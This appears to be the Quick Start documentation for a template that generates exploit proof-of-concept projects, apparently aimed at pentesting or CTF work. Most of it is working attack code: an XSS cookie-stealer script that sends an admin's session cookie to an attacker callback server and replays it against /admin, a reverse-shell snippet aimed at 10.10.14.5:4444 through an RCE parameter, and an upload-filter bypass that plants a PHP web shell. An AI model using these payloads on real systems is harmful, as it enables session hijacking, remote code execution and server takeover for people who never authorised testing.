Quick Start
===========

Build your first POC in 5 minutes.

Prerequisites
-------------

Install `uv <https://docs.astral.sh/uv/>`_ (used for package management and running cookiecutter):

.. code-block:: bash

   # macOS/Linux
   curl -LsSf https://astral.sh/uv/install.sh | sh

   # Or with pip
   pip install uv

   # Or with brew (macOS)
   brew install uv

Create a New POC Project
------------------------

.. code-block:: bash

   uvx cookiecutter https://github.com/kwkeefer/cookiecutter-poc

Answer the prompts (or press Enter for defaults).

Run Your First Command
-----------------------

.. code-block:: bash

   cd your_project_name
   uv run your_project --help

Your First Exploit
-------------------

Edit ``src/your_project/exploit.py``:

.. code-block:: python

   """
   Simple XSS cookie stealer POC
   """
   import requests
   from your_project.utils.output import out
   from your_project.utils.xss import cookie_stealer
   from your_project.utils.server_hooks import get_cookie
   from your_project.utils.cookie import parse_cookie_string

   def main(target_url, lhost, lport):
       """Exploit XSS to steal admin cookie"""

       # Generate XSS payload
       payload = cookie_stealer(f"http://{lhost}:{lport}")
       out.info(f"Payload: {payload}")

       # Send payload to target
       out.status("Sending XSS payload...")
       requests.post(f"{target_url}/comment",
                    data={"content": payload})

       # Wait for admin to visit
       out.status("Waiting for callback...")
       cookie = get_cookie(timeout=60)

       if cookie:
           out.success(f"Cookie captured: {cookie}")

           # Parse and use it
           cookies = parse_cookie_string(cookie)
           r = requests.get(f"{target_url}/admin", cookies=cookies)

           if "Admin Panel" in r.text:
               out.success("Successfully accessed admin panel!")
           else:
               out.error("Cookie didn't grant admin access")
       else:
           out.error("No callback received")

   if __name__ == "__main__":
       import argparse
       parser = argparse.ArgumentParser()
       parser.add_argument("--target", default="http://target.local")
       parser.add_argument("--lhost", required=True)
       parser.add_argument("--lport", default=8000, type=int)
       args = parser.parse_args()

       main(args.target, args.lhost, args.lport)

Run Your Exploit
----------------

In one terminal, start the HTTP callback server:

.. code-block:: bash

   uv run your_project --server

In another terminal, run your exploit:

.. code-block:: bash

   python src/your_project/exploit.py --lhost YOUR_IP --target http://victim.com

Common Patterns
---------------

**Colored Output**

.. code-block:: python

   from your_project.utils.output import out

   out.success("Vulnerability confirmed!")
   out.error("Connection failed")
   out.info("Starting exploit")
   out.warning("Using default credentials")
   out.debug("Response: 200 OK")

**Reverse Shell**

.. code-block:: python

   from your_project.utils.reverse_shells import python_oneliner
   from your_project.utils.shell_catcher import auto_shell

   # Generate shell payload
   cmd = python_oneliner("10.10.14.5", 4444)

   # Catch shell automatically
   with auto_shell(4444) as catcher:
       # Trigger RCE with your payload
       requests.get(f"{target}/rce?cmd={cmd}")

       # Interact with shell
       if catcher.shell_caught:
           catcher.stabilize()  # Upgrade to PTY
           catcher.interact()   # Full interactive shell!

**File Upload**

.. code-block:: python

   from your_project.utils.file_upload import FileUploader

   uploader = FileUploader(f"{target}/upload")
   result = uploader.upload_with_bypass(
       "shell.php",
       b"<?php system($_GET['cmd']); ?>",
       techniques=["double_extension", "null_byte"]
   )

Next Steps
----------

* Explore more :doc:`examples`
* Read :doc:`workflows` for end-to-end scenarios
* Browse the :doc:`api/index` for all available utilities
